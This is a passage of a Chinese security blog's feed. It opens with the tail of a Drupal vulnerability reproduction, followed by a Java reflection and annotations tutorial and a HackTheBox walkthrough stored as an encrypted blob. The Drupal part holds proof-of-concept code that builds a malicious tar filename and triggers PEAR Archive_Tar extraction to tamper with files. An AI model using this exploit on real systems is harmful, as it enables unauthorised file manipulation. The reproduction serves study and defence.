class="string">&quot;test&quot;</span> &gt; /tmp/target_file</span><br></pre></td></tr></table></figure><p>再用python脚本生成带有恶意payload文件名的压缩文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line">tar = tarfile.open(<span class="string">&#x27;exploit.tar&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">tar.add(<span class="string">&#x27;input_file.txt&#x27;</span>, <span class="string">&#x27;file:///tmp/target_file&#x27;</span>)</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure><p>最后执行同样的漏洞触发代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&#x27;../Archive/Tar.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  $archive = <span class="keyword">new</span> Archive_Tar(<span class="string">&#x27;exploit.tar&#x27;</span>);</span><br><span class="line">  $archive-&gt;extract();</span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/drupal">https://github.com/vulhub/vulhub/tree/master/drupal</a></p><p><a href="https://paper.seebug.org/334/">https://paper.seebug.org/334/</a></p><p><a href="http://blog.topsec.com.cn/%e5%85%b3%e4%ba%8edrupal8%e7%b3%bb%e5%88%97%e6%a1%86%e6%9e%b6%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%b7%b1%e5%85%a5%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/关于drupal8系列框架和漏洞动态调试深入分析/</a></p><p><a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://kylingit.com/blog/由phpggc理解php反序列化漏洞/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Durpal历史漏洞复现记录&quot;&gt;Durpal历史漏洞复现记录&lt;/h1&gt;
&lt;p&gt;在具体分析Drupal的历史漏洞之前，可能需要先大致了解一下Durpal的整个工作流程，这里推荐三篇文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/u
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Java基础学习之反射和注解</title>
    <link href="http://ca0y1h.top/Java/code/5.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%92%8C%E6%B3%A8%E8%A7%A3/"/>
    <id>http://ca0y1h.top/Java/code/5.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%92%8C%E6%B3%A8%E8%A7%A3/</id>
    <published>2021-01-22T13:31:59.000Z</published>
    <updated>2021-01-22T13:33:08.244Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java基础学习之反射和注解">Java基础学习之反射和注解</h1><p>Reference: <a href="https://liaoxuefeng.com">https://liaoxuefeng.com</a></p><h2 id="0x01-反射">0x01 反射</h2><h3 id="Class类">Class类</h3><p>JVM每加载一种<code>class</code>，就为其创建一个<code>Class</code>实例，并关联起来。注意：这里的<code>Class</code>类型是一个名叫<code>Class</code>的<code>class</code>，形如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Class</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以String类为例，当JVM加载String类的时候，首先会读取<code>String.class</code>到内存，然后，为<code>String</code>类创建一个<code>Class</code>实例并关联起来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls = <span class="keyword">new</span> Class(String);</span><br></pre></td></tr></table></figure><p>JVM持有的每个<code>Class</code>实例都指向一个数据类型（<code>class</code>或<code>interface</code>）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; String</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.lang.String&quot;  │</span><br><span class="line">└───────────────────────────┘</span><br><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; Random</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.util.Random&quot;  │</span><br><span class="line">└───────────────────────────┘</span><br><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; Runnable</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.lang.Runnable&quot;│</span><br><span class="line">└───────────────────────────┘</span><br></pre></td></tr></table></figure><p>一个<code>Class</code>实例包含了该<code>class</code>的所有完整信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; String</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.lang.String&quot;  │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│package &#x3D; &quot;java.lang&quot;      │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│super &#x3D; &quot;java.lang.Object&quot; │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│interface &#x3D; CharSequence...│</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│field &#x3D; value[],hash,...   │</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│method &#x3D; indexOf()...      │</span><br><span class="line">└───────────────────────────┘</span><br></pre></td></tr></table></figure><p>由于JVM为每个加载的<code>class</code>创建了对应的<code>Class</code>实例，并在实例中保存了该<code>class</code>的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个<code>Class</code>实例，我们就可以通过这个<code>Class</code>实例获取到该实例对应的<code>class</code>的所有信息。</p><p>这种通过<code>Class</code>实例获取<code>class</code>信息的方法称为反射（Reflection）。</p><p>获取一个<code>class</code>的<code>Class</code>实例有三种方法：</p><p>方法一：直接通过一个<code>class</code>的静态变量<code>class</code>获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls &#x3D; String.class;</span><br></pre></td></tr></table></figure><p>方法二：如果我们有一个实例变量，可以通过该实例变量提供的<code>getClass()</code>方法获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String s &#x3D; &quot;Hello&quot;;</span><br><span class="line">Class cls &#x3D; s.getClass();</span><br></pre></td></tr></table></figure><p>方法三：如果知道一个<code>class</code>的完整类名，可以通过静态方法<code>Class.forName()</code>获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls &#x3D; Class.forName(&quot;java.lang.String&quot;);</span><br></pre></td></tr></table></figure><h3 id="访问字段">访问字段</h3><p><code>Class</code>类提供了以下几个方法来获取字段：</p><ul><li>Field getField(name)：根据字段名获取某个public的field（包括父类）</li><li>Field getDeclaredField(name)：根据字段名获取当前类的某个field（不包括父类）</li><li>Field[] getFields()：获取所有public的field（包括父类）</li><li>Field[] getDeclaredFields()：获取当前类的所有field（不包括父类）</li></ul><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118113344.png" alt=""></p><p>一个<code>Field</code>对象包含了一个字段的所有信息：</p><ul><li><code>getName()</code>：返回字段名称，例如，<code>&quot;name&quot;</code>；</li><li><code>getType()</code>：返回字段类型，也是一个<code>Class</code>实例，例如，<code>String.class</code>；</li><li><code>getModifiers()</code>：返回字段的修饰符，它是一个<code>int</code>，不同的bit表示不同的含义。</li></ul><p>还是以上面这段代码为例：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118113943.png" alt=""></p><h4 id="获取字段值">获取字段值</h4><p>利用反射拿到字段的一个<code>Field</code>实例之后，可以拿到一个实例对应的该字段的值：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118115216.png" alt=""></p><p>如果不调用<code>Field.setAccessible(true)</code>，就会抛出一个<code>IllegalAccessException</code>的错误，这是因为<code>name</code>字段被定义成<code>private</code>。</p><h4 id="设置字段值">设置字段值</h4><p>除了使用get方法获取字段值，还可以用set方法获取字段值：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118115646.png" alt=""></p><p>同样，修改非<code>public</code>字段，需要首先调用<code>setAccessible(true)</code>。</p><h3 id="调用方法">调用方法</h3><p><code>Class</code>类提供了以下几个方法来获取<code>Method</code>：</p><ul><li><code>Method getMethod(name, Class...)</code>：获取某个<code>public</code>的<code>Method</code>（包括父类）</li><li><code>Method getDeclaredMethod(name, Class...)</code>：获取当前类的某个<code>Method</code>（不包括父类）</li><li><code>Method[] getMethods()</code>：获取所有<code>public</code>的<code>Method</code>（包括父类）</li><li><code>Method[] getDeclaredMethods()</code>：获取当前类的所有<code>Method</code>（不包括父类）</li></ul><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118121523.png" alt=""></p><p>一个<code>Method</code>对象包含一个方法的所有信息：</p><ul><li><code>getName()</code>：返回方法名称，例如：<code>&quot;getScore&quot;</code>；</li><li><code>getReturnType()</code>：返回方法返回值类型，也是一个Class实例，例如：<code>String.class</code>；</li><li><code>getParameterTypes()</code>：返回方法的参数类型，是一个Class数组，例如：<code>&#123;String.class, int.class&#125;</code>；</li><li><code>getModifiers()</code>：返回方法的修饰符，它是一个<code>int</code>，不同的bit表示不同的含义。</li></ul><p>当我们获取到一个<code>Method</code>对象时，就可以对它进行调用。我们以下面的代码为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String s &#x3D; &quot;Hello world&quot;;</span><br><span class="line">String r &#x3D; s.substring(6); &#x2F;&#x2F; &quot;world&quot;</span><br></pre></td></tr></table></figure><p>如果用反射来调用<code>substring</code>方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118145036.png" alt=""></p><h4 id="调用静态方法">调用静态方法</h4><p>如果获取到的Method表示一个静态方法，调用静态方法时，由于无需指定实例对象，所以<code>invoke</code>方法传入的第一个参数永远为<code>null</code>。以<code>Integer.parseInt(String)</code>为例：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118145348.png" alt=""></p><h4 id="调用非public方法">调用非public方法</h4><p>和Field类似，对于非public方法，我们虽然可以通过<code>Class.getDeclaredMethod()</code>获取该方法实例，但直接对其调用将得到一个<code>IllegalAccessException</code>。为了调用非public方法，我们通过<code>Method.setAccessible(true)</code>允许其调用：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118145724.png" alt=""></p><h4 id="多态">多态</h4><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118150644.png" alt=""></p><p>一个<code>Person</code>类定义了<code>hello()</code>方法，并且它的子类<code>Student</code>也覆写了<code>hello()</code>方法，那么，从<code>Person.class</code>获取的<code>Method</code>，作用于<code>Student</code>实例时，同样会遵循多态原则，实际调用的是<code>Student</code>类的<code>hello()</code>方法。</p><h3 id="调用构造方法">调用构造方法</h3><p>Java的反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118152642.png" alt=""></p><p>通过Class实例获取Constructor的方法如下：</p><ul><li><code>getConstructor(Class...)</code>：获取某个<code>public</code>的<code>Constructor</code>；</li><li><code>getDeclaredConstructor(Class...)</code>：获取某个<code>Constructor</code>；</li><li><code>getConstructors()</code>：获取所有<code>public</code>的<code>Constructor</code>；</li><li><code>getDeclaredConstructors()</code>：获取所有<code>Constructor</code>。</li></ul><h3 id="获取继承关系">获取继承关系</h3><h4 id="获取父类class">获取父类class</h4><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118163859.png" alt=""></p><h4 id="获取interface">获取interface</h4><p>由于一个类可能实现一个或多个接口，通过<code>Class</code>我们就可以查询到实现的接口类型。例如，查询<code>String</code>实现的接口：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118164136.png" alt=""></p><h3 id="动态代理">动态代理</h3><p><a href="https://www.jianshu.com/p/95970b089360">https://www.jianshu.com/p/95970b089360</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210118170645.png" alt=""></p><p>在运行期动态创建一个<code>interface</code>实例的方法如下：</p><ol><li>定义一个<code>InvocationHandler</code>实例，它负责实现接口的方法调用；</li><li>通过<code>Proxy.newProxyInstance()</code>创建<code>interface</code>实例，它需要3个参数：<ol><li>使用的<code>ClassLoader</code>，通常就是接口类的<code>ClassLoader</code>；</li><li>需要实现的接口数组，至少需要传入一个接口进去；</li><li>用来处理接口方法调用的<code>InvocationHandler</code>实例。</li></ol></li><li>将返回的<code>Object</code>强制转型为接口。</li></ol><h2 id="0x02-注解">0x02 注解</h2><h3 id="常用的元注解">常用的元注解</h3><h4 id="Target">@Target</h4><p>使用<code>@Target</code>可以定义<code>Annotation</code>能够被应用于源码的哪些位置：</p><ul><li>类或接口：<code>ElementType.TYPE</code>；</li><li>字段：<code>ElementType.FIELD</code>；</li><li>方法：<code>ElementType.METHOD</code>；</li><li>构造方法：<code>ElementType.CONSTRUCTOR</code>；</li><li>方法参数：<code>ElementType.PARAMETER</code>。</li></ul><h4 id="Retention">@Retention</h4><p>元注解<code>@Retention</code>定义了<code>Annotation</code>的生命周期：</p><ul><li>仅编译期：<code>RetentionPolicy.SOURCE</code>；</li><li>仅class文件：<code>RetentionPolicy.CLASS</code>；</li><li>运行期：<code>RetentionPolicy.RUNTIME</code>。</li></ul><p>如果<code>@Retention</code>不存在，则该<code>Annotation</code>默认为<code>CLASS</code>。</p><h3 id="如何定义Annotation">如何定义Annotation</h3><p>我们总结一下定义<code>Annotation</code>的步骤：</p><p>第一步，用<code>@interface</code>定义注解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public @interface Report &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步，添加参数、默认值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public @interface Report &#123;</span><br><span class="line">    int type() default 0;</span><br><span class="line">    String level() default &quot;info&quot;;</span><br><span class="line">    String value() default &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把最常用的参数定义为<code>value()</code>，推荐所有参数都尽量设置默认值。</p><p>第三步，用元注解配置注解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@Target(ElementType.TYPE)</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">public @interface Report &#123;</span><br><span class="line">    int type() default 0;</span><br><span class="line">    String level() default &quot;info&quot;;</span><br><span class="line">    String value() default &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，必须设置<code>@Target</code>和<code>@Retention</code>，<code>@Retention</code>一般设置为<code>RUNTIME</code>，因为我们自定义的注解通常要求在运行期读取。</p><h3 id="使用注解">使用注解</h3><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Range(min = 1, max = 20)</span></span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Range(max = 10)</span></span><br><span class="line"><span class="keyword">public</span> String city;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Range(min = 1, max = 100)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, String city, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="keyword">this</span>.city = city;</span><br><span class="line"><span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> String.format(<span class="string">&quot;&#123;Person: name=%s, city=%s, age=%d&#125;&quot;</span>, name, city, age);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Range.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.FIELD)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Range &#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">()</span> <span class="keyword">default</span> 255</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Learn Java from https://www.liaoxuefeng.com/</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> liaoxuefeng</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Person p1 = <span class="keyword">new</span> Person(<span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Beijing&quot;</span>, <span class="number">20</span>);</span><br><span class="line">Person p2 = <span class="keyword">new</span> Person(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Shanghai&quot;</span>, <span class="number">20</span>);</span><br><span class="line">Person p3 = <span class="keyword">new</span> Person(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Shanghai&quot;</span>, <span class="number">199</span>);</span><br><span class="line"><span class="keyword">for</span> (Person p : <span class="keyword">new</span> Person[] &#123; p1, p2, p3 &#125;) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">check(p);</span><br><span class="line">System.out.println(<span class="string">&quot;Person &quot;</span> + p + <span class="string">&quot; checked ok.&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Person &quot;</span> + p + <span class="string">&quot; checked failed: &quot;</span> + e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(Person person)</span> <span class="keyword">throws</span> IllegalArgumentException, ReflectiveOperationException </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (Field field : person.getClass().getFields()) &#123;</span><br><span class="line">Range range = field.getAnnotation(Range.class);</span><br><span class="line"><span class="keyword">if</span> (range != <span class="keyword">null</span>) &#123;</span><br><span class="line">Object value = field.get(person);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line"><span class="keyword">if</span> (value <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">String s = (String) value;</span><br><span class="line"><span class="keyword">if</span> (s.length() &lt; range.min() || s.length() &gt; range.max())&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid name&quot;</span> + field.getName());</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> Integer)&#123;</span><br><span class="line">Integer i = (Integer) value;</span><br><span class="line"><span class="keyword">if</span> (i &lt; range.min() || i &gt; range.max())&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid age&quot;</span> + field.getName());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Person &#123;Person: name=Bob, city=Beijing, age=<span class="number">20</span>&#125; checked ok.</span><br><span class="line">Person &#123;Person: name=, city=Shanghai, age=<span class="number">20</span>&#125; checked failed: java.lang.IllegalArgumentException: Invalid namename</span><br><span class="line">Person &#123;Person: name=Alice, city=Shanghai, age=<span class="number">199</span>&#125; checked failed: java.lang.IllegalArgumentException: Invalid ageage</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java基础学习之反射和注解&quot;&gt;Java基础学习之反射和注解&lt;/h1&gt;
&lt;p&gt;Reference: &lt;a href=&quot;https://liaoxuefeng.com&quot;&gt;https://liaoxuefeng.com&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-反射&quot;
      
    
    </summary>
    
    
      <category term="编程" scheme="http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="java" scheme="http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/java/"/>
    
    
      <category term="java" scheme="http://ca0y1h.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Doctor-Walkthrough</title>
    <link href="http://ca0y1h.top/Target_drone/HackTheBox/21.HackTheBox-Doctor-Walkthrough/"/>
    <id>http://ca0y1h.top/Target_drone/HackTheBox/21.HackTheBox-Doctor-Walkthrough/</id>
    <published>2021-01-22T13:23:10.000Z</published>
    <updated>2021-01-31T04:08:43.779Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fb043ad81f0c53c870662d070af0314825921d4b2bdae224f6304c2bb5f15d29">9b1741d19bc98bca523cf47d84dfbbb085c3cf46a927ce65af6caef4061203a13c87c3a4c935e0704b25a7e2e749a10fe267df92bc5181ec5f664396551e371063efbd76fccb672411efec167a5d02f48d2eca441c6f051302df5f710faa172f2005ad12f8a2677df0ae6c70663a1b452c43a311061e2027e5a46d26a4869a707ef50cd89b008f92c675273e7a2b9e948d7310c4b5b8a63bcc1097d7a3f3aa9fac55d714883138c0edbfa6b158e031959ab86a47b246691e34c338da183f50e521fc53ac06e6eab9b2757a946ba01f2abe04b1cdb453cb2838fff9336cbdd733d98a90d1fa7c0cf0b2c86501415aa4c8b3b19ae3d5d31459a907a2d27809e8ceda871f6677570690722f458fcffdce3659da88d8f09ea83b069be182f38fec138c9e00d814521f4a772e51173c0dbdfc7703d94f86995b44b7b2d63138baac923eb714e6813fb50a8a885d59a44e7002ccafb9e38ac7ef7103c0efb9422f9f116262313b210ca8bc1c7f23315e37c6a514df4776ffc7928e5725147c7550c08295f710cbede9d9eed1b51fa1370e54f2e9b9f5aaec8abdc7aa56851c87fdaf165ef85fab53b52f31286314724c33e15e575181189f7a2ec25eca8248437b1d98aa1f31980ecc91c64b913baf7bda5421c62f57c9a956ee1f1cce16ac3643a030cfa920b9857a403528a8fbc407746c957fe0d7db269d181a7c4453635bcfb48a73b058f72123d39e0587ee7fb2fb4c56a71d089221e7a6be0dc96bbb2c477d0ba65c723559a0aae1a49fb84fd4fe3c33628dda9fffd4e09b54cd6da848a6cf42a966211a1c9d1888766a4c6e454fc59870a49174e72b8ff765a0c9f2a544776c6d88601f1736771450fb1e71b9e654f8ed6bcb4fac89c5bd024d75dcc4a1d4c781e7949e100ecde2913710fe3a9d63ae6bba1ea3d94744e17e7fa594057e61aa80ccb4e99a2f3f1f3e77532e9cc5aae5c21ffdd011ec344fd088d0876c44a815ce81c7520a3b16618abbf0a236e135c09b5fb8ab4ae5bfe949c475a12dc4c71c670c45ab81f9a0c0172d464f02aed4edeed7e64427e6c987b32a743b847ff268c9f8fb2bcc8af9e50e6c4fa1e9e6be8e9371cee3d60f84fb0cfc6cae7a3b30d76ca63f25c2901291f9f494cd6c8b708776b63b4868b21394df33f1145fb33ec5cd80b71e114e6392529378c39b6521737b5b2a628043a5b67035e2f4107f37e65383ad8c5164912f53ce7f4d27cf8e193aea4c7234d8bd8166b328479f3a12314fdd4040f8036af283612c8f3df4747cd4adb4c459950fe43e4097ee326b7774bfc8